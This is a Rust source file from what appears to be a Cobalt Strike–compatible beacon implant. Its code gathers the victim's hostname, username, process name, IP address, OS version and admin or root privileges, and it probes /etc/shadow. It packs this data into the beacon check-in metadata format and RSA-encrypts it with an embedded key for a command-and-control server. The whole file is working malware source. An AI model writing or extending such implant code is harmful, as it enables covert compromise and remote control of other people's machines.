use crate::util::os_command::os_system;
use std::convert::TryInto;
use std::mem;
use std::net::{IpAddr, Ipv4Addr};
use sys_info;
use std::process::Command;
use std::process;

use anyhow::Result;
use local_ip_address::local_ip;
use rsa::pkcs8::DecodePublicKey;
use rsa::{PaddingScheme, PublicKey, RsaPublicKey};
use sha2::{Digest, Sha256};
use windows_sys::Win32::Foundation::{BOOL, HANDLE};
use windows_sys::Win32::System::SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO};
use windows_sys::Win32::System::Threading::{GetCurrentProcess, IsWow64Process};
use windows_sys::Win32::UI::Shell::IsUserAnAdmin;

use crate::config::PUB_KEY;
use crate::util::crypt::Rng;

#[derive(Debug, Clone, Copy)]
pub struct Beacon {
    pub(crate) id: u32,
    base_key: [u8; 16],
    pub(crate) aes_key: [u8; 16],
    pub(crate) hmac_key: [u8; 16],
}

impl Beacon {
    pub(crate) fn init() -> Self {
        let key = Rng::new().gen_bytes(16);
        let mut hasher = Sha256::new();
        hasher.update(&key);
        let sha256hash = hasher.finalize();
        assert_eq!(sha256hash.len(), 32);
        let aes_key = &sha256hash[0..16];
        let hmac_key = &sha256hash[16..];
        let mut beacon_id = Rng::new().rand_range(100000, 999998) as u32;
        if beacon_id % 2 != 0 {
            beacon_id += 1;
        }
        Beacon {
            id: beacon_id,
            base_key: key.as_slice().try_into().unwrap(),
            aes_key: aes_key.try_into().unwrap(),
            hmac_key: hmac_key.try_into().unwrap(),
        }
    }

    #[cfg(target_os = "linux")]
    pub(crate) fn collect_info(&self) -> anyhow::Result<String> {
        let process_id = std::process::id();
        let ssh_port = 0u16;
        let metadata_flag = {
            let mut flag = 0u8;
            if fs::read("/etc/shadow").is_ok() {
                flag += 8;
            }
            if Command::new("uname").arg("-p").output().unwrap().stdout == b"x86_64\n" {
                flag += 4;
            }
            if std::env::consts::ARCH == "x86_64" {
                flag += 2;
            }
            flag
        };
        // 5.15.0-48-generic
        let os_version = os_system("uname -r").unwrap_or("unknow_version".into());
        let os_version_maj = os_version
            .split(".")
            .nth(0)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_version_min = os_version
            .split(".")
            .nth(1)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_build = 48u16;
        let ptr_func_addr = 0u32;
        let ptr_gmh_func_addr = 0u32;
        let ptr_gpa_func_addr = 0u32;
        let process_name: String = {
            let cur_exe = std::env::current_exe().unwrap();
            let name = cur_exe.file_name().unwrap();
            name.to_string_lossy().to_string()
        };
        let host_name =
            String::from_utf8(Command::new("hostname").output().unwrap().stdout).unwrap();
        let host_name = host_name.trim();
        let user_name = os_system("whoami").unwrap_or("unknow_name".into());
        let local_ip = u32::from_le_bytes("127.0.0.1".parse::<Ipv4Addr>().unwrap().octets());
        let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
        let locale_ansi = 936u16;
        let locale_oem = 936u16;
        let online_info = [
            &self.id.to_be_bytes()[..],
            &process_id.to_be_bytes()[..],
            &ssh_port.to_be_bytes()[..],
            &metadata_flag.to_be_bytes()[..],
            &os_version_maj.to_be_bytes()[..],
            &os_version_min.to_be_bytes()[..],
            &os_build.to_be_bytes()[..],
            &ptr_func_addr.to_be_bytes()[..],
            &ptr_gmh_func_addr.to_be_bytes()[..],
            &ptr_gpa_func_addr.to_be_bytes()[..],
            &local_ip.to_be_bytes()[..],
            &os_info,
        ]
        .concat();
        let meta_info = [
            &self.base_key,
            &locale_ansi.to_be_bytes()[..],
            &locale_oem.to_be_bytes()[..],
            &online_info,
        ]
        .concat();
        let magic = 0xbeefu32;
        let raw_pkg = [
            &magic.to_be_bytes()[..],
            &(meta_info.len() as u32).to_be_bytes()[..],
            meta_info.as_slice(),
        ]
        .concat();
        let public_key = RsaPublicKey::from_public_key_pem(PUB_KEY).expect("wrong PEM format");
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let mut rng = rand::thread_rng();
        let enc_pkg = public_key.encrypt(&mut rng, padding, &raw_pkg[..])?;
        let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
        Ok(pkg)
    }

    #[cfg(target_os = "windows")]
    pub fn collect_info(&self) -> anyhow::Result<String> {
        let process_id = std::process::id();
        let port = 0u16;
        //判断系统位数以及system权限
        let metadata_flag = {
            let mut flag = 0u8;
            let mut system_info: SYSTEM_INFO = unsafe { mem::zeroed() };
            unsafe {
                GetNativeSystemInfo(&mut system_info);
            }
            
            unsafe {
                let process_handle = unsafe { GetCurrentProcess() }; // 获取当前进程句柄
                
                if IsUserAnAdmin() == 1 {
                    flag += 8;
                }
                
                if system_info.Anonymous.Anonymous.wProcessorArchitecture as u32 == 9 {
                    // PROCESSOR_ARCHITECTURE_AMD64 = 9
                    // println!("Running on 64-bit architecture (x86_64).");
                    flag += 4;
                }
                if is_process_64_bit(process_handle) {
                    // PROCESSOR_ARCHITECTURE_INTEL = 0
                    flag += 2;
                }
            }
            flag
        };
        
        // let os_version = os_system("ver").unwrap_or("unknow_version".into());
        // println!("os:{}",os_version);
        let os_version = sys_info::os_release().unwrap_or_else(|_| "unknown_version".into());
        // println!("OS Version: {}", os_version);
        let mut os_version_maj: u8 = 0;
        if let Some(version_str) = os_version.split(".").next() {
            if let Ok(version_num) = version_str
                .chars()
                .filter(|c| c.is_digit(10))
                .collect::<String>()
                .parse::<usize>()
            {
                os_version_maj = version_num as u8;
            }
        }
        let os_version_min = os_version
            .split(".")
            .nth(1)
            .map(|x| x.parse::<usize>().unwrap())
            .unwrap() as u8;
        let os_build: u16 = 1;
        let ptr_func_addr = 0u32;
        let ptr_gmh_func_addr = 0u32;
        let ptr_gpa_func_addr = 0u32;
        let process_name: String = {
            let cur_exe = std::env::current_exe().unwrap();
            let name = cur_exe.file_name().unwrap();
            name.to_string_lossy().to_string()
        };
        
        // let host_name = os_system("hostname").unwrap_or("unknow_hostname".into());
        // let host_name = sys_info::hostname().unwrap_or_else(|_| "unknown_hostname".into());
        let host_name = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown_hostname".into());
        
        // let user_name = os_system("whoami").unwrap_or("unknow_name".into());
        let user_name = std::env::var("USERNAME").unwrap_or_else(|_| "unknown_name".into());
        /*let output = Command::new("whoami")
            .output()
            .expect("failed to execute command");

        let user_name = String::from_utf8_lossy(&output.stdout).trim().to_string();
        */
        
        let local_ip = match local_ip() {
            Ok(ip) => {
                // println!("local internal IP address is: {:?}", ip);
                ip
            }
            Err(e) => {
                // eprintln!("unable to obtain the internal network IP address: {}", e);
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
            }
        };
        let mut ip_bytes = match local_ip {
            IpAddr::V4(ipv4) => ipv4.octets().to_vec(),
            IpAddr::V6(_) => {
                // eprintln!("Getting an IPv6 address and returning 127.0.0.1");
                Ipv4Addr::new(127, 0, 0, 1).octets().to_vec()
            }
        };
        //reverse the byte--otherwise the CS display will not be normal
        ip_bytes.reverse();
        let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
        let locale_ansi = 65001u16;
        let locale_oem = 65001u16;
        let online_info = [
            &self.id.to_be_bytes()[..],
            &process_id.to_be_bytes()[..],
            &port.to_be_bytes()[..],
            &metadata_flag.to_be_bytes()[..],
            &os_version_maj.to_be_bytes()[..],
            &os_version_min.to_be_bytes()[..],
            &os_build.to_le_bytes()[..],
            &ptr_func_addr.to_be_bytes()[..],
            &ptr_gmh_func_addr.to_be_bytes()[..],
            &ptr_gpa_func_addr.to_be_bytes()[..],
            &ip_bytes[..],
            &os_info,
        ]
        .concat();
        let meta_info = [
            &self.base_key,
            &locale_ansi.to_le_bytes()[..],
            &locale_oem.to_le_bytes()[..],
            &online_info,
        ]
        .concat();
        let magic = 0xbeefu32;
        let raw_pkg = [
            &magic.to_be_bytes()[..],
            &(meta_info.len() as u32).to_be_bytes()[..],
            meta_info.as_slice(),
        ]
        .concat();
        let public_key = RsaPublicKey::from_public_key_pem(PUB_KEY).expect("wrong PEM format");
        let padding = PaddingScheme::new_pkcs1v15_encrypt();
        let mut rng = rand::thread_rng();
        let enc_pkg = public_key.encrypt(&mut rng, padding, &raw_pkg[..])?;
        let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
        Ok(pkg)
    }
}

fn is_process_64_bit(process_handle: HANDLE) -> bool {
    let mut is_wow64: BOOL = 0;
    unsafe {
        if IsWow64Process(process_handle, &mut is_wow64) == 0 {
            // 调用失败，返回 false
            return false;
        }
    }
    is_wow64 == 0 // 如果是 WOW64，返回 false；否则返回 true
}
